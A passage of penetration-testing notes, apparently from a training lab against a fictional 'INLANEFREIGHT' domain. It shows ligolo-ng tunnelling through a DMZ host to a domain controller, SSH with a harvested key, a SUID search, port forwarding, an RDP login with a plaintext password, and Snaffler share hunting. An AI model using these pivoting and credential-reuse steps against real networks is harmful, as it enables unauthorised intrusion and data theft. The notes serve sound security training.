ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
ligolo-ng » 
ligolo-ng » INFO[0011] Agent joined.                                 id=0050568a0dfe name=root@dmz01 remote="10.129.87.206:56416"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - root@dmz01 - 10.129.87.206:56416 - 0050568a0dfe
[Agent : root@dmz01] » autoroute 
? Select routes to add: 172.16.8.120/16
? Create a new interface or use an existing one? Create a new interface
? Enter interface name (leave empty for random name): subzero
INFO[0034] Using custom interface name: subzero         
WARN[0034] Interface subzero already exists physically  
WARN[0034] Interface subzero exists but is not in use. Removing it to avoid conflicts... 
INFO[0034] Interface subzero configured (will be created on tunnel start) 
INFO[0034] Creating routes for subzero...               
? Start the tunnel? Yes
INFO[0036] Starting tunnel to root@dmz01 (0050568a0dfe) 
[Agent : root@dmz01] » session
? Specify a session : 1 - root@dmz01 - 10.129.87.206:56416 - 0050568a0dfe
[Agent : root@dmz01] » listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
INFO[0970] Listener 0 created on remote agent!          
[Agent : root@dmz01] » INFO[1424] Agent joined.                                 id=0050568a6798 name="INLANEFREIGHT\\Administrator@DC01" remote="127.0.0.1:40840"
[Agent : root@dmz01] » 
[Agent : root@dmz01] » session
? Specify a session : 2 - INLANEFREIGHT\Administrator@DC01 - 127.0.0.1:40840 - 0050568a6798
[Agent : INLANEFREIGHT\Administrator@DC01] » autoroute 
? Select routes to add: 172.16.9.3/23
? Create a new interface or use an existing one? Create a new interface
? Enter interface name (leave empty for random name): 
INFO[1462] Generating a random interface name...        
INFO[1462] Using interface name provenpetanque          
INFO[1462] Interface provenpetanque configured (will be created on tunnel start) 
INFO[1462] Creating routes for provenpetanque...        
? Start the tunnel? Yes
INFO[1464] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (0050568a6798) 
```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~171_

```
$ proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 23 Jun 2022 01:48:14 AM UTC

  System load:  0.0                Processes:               231
  Usage of /:   27.9% of 13.72GB   Users logged in:         0
  Memory usage: 14%                IPv4 address for ens192: 172.16.9.25
  Swap usage:   0%


159 updates can be applied immediately.
103 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~201_

```
$ uname -a

Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~215_

```
$ find / -perm -4000 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount

<SNIP>
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~56_

```
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~61_

```
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~115_

```
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe
        1 file(s) copied.

c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2022-06-22 10:57:33 -07:00 [Share] {Green}(\\DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$)
Press any key to exit.
```
